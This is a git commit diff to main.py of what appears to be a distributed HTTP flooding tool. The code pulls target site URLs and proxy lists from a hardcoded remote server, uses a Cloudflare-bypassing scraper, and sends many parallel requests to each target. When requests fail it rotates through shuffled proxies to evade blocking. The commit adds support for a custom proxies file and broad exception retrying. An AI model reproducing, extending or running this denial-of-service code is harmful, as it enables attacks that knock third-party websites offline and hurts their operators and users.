8679269f2e69f36d44082f5589de58a36e9118eb
Abionics <abionics.dev@gmail.com>
2022-02-27 13:53:03 +0200

    Add custom proxies file, some fixes

--- main.py
+++ main.py
@@ -9,7 +9,7 @@ from aiohttp import ClientTimeout
 from loguru import logger
 from urllib3 import disable_warnings
 
-HOSTS = ['http://46.4.63.238/api.php']
+HOSTS = ['http://46.4.63.238/api.php']  # api for getting fucking sites
 TIMEOUT = ClientTimeout(
     total=20,
     connect=10,
@@ -17,6 +17,7 @@ TIMEOUT = ClientTimeout(
     sock_connect=10,
 )
 CUSTOM_PROXY = None  # can be like 'http://login:username@1.2.3.4:5678' OR 'http://1.2.3.4:5678'
+CUSTOM_PROXIES_FILE = None  # name of file with list of proxies, each one in separate line
 REQUESTS_PER_SITE = 50
 PARALLEL_COUNT = 20
 SHOW_REQUEST_EXCEPTIONS = False
@@ -33,24 +34,41 @@ def main():
 
 async def start_one():
     while True:
-        host = random.choice(HOSTS)
-        content = requests.get(host).content
-        if not content:
-            await start_one()
-        data = json.loads(content)
-        url = data['site']['url']
-        proxies = data['proxy']
-        async with CloudflareScraper(timeout=TIMEOUT) as session:
-            success = await attempt(session, url)
-            if not success:
-                if CUSTOM_PROXY:
-                    await attempt(session, url, CUSTOM_PROXY)
-                else:
-                    for proxy_data in proxies:
-                        proxy = f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
+        try:
+            host = random.choice(HOSTS)
+            content = requests.get(host).content
+            data = json.loads(content)
+            url = data['site']['url']
+            url = _fix_url(url)
+            async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
+                success = await attempt(session, url)
+                if not success:
+                    if CUSTOM_PROXY:
+                        proxies = [CUSTOM_PROXY]
+                    elif CUSTOM_PROXIES_FILE:
+                        proxies = _load_proxies(CUSTOM_PROXIES_FILE)
+                    else:
+                        proxies = [
+                            f'http://{proxy_data["auth"]}@{proxy_data["ip"]}'
+                            for proxy_data in data['proxy']
+                        ]
+                    random.shuffle(proxies)
+                    for proxy in proxies:
+                        proxy = _fix_url(proxy)
                         success = await attempt(session, url, proxy)
                         if success:
                             break
+        except Exception as e:
+            logger.warning(f'Exception, retrying, exception={e}')
+
+
+def _load_proxies(filename: str) -> list:
+    with open(filename, 'r') as file:
+        return file.read().splitlines()
+
+
+def _fix_url(url: str) -> str:
+    return url if url.startswith('http') else 'http://' + url
 
 
 async def attempt(session: CloudflareScraper, url: str, proxy: str = None) -> bool:
